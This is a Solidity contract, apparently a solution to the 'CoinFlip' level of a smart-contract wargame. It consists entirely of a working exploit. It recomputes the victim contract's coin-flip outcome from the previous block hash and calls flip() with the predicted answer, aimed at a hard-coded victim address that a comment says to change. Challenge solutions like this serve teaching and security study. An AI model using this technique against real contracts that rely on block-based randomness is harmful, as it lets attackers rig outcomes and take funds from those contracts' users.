pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract Attack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    // CHANGE ADDRESS OF VICTIM CONTRACT
    CoinFlip public victimContract = CoinFlip(0x5E6FFf0e918fDB111dd3b987b523c5AF2ca19eBB);

    function attack () public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        victimContract.flip(side);
    }
}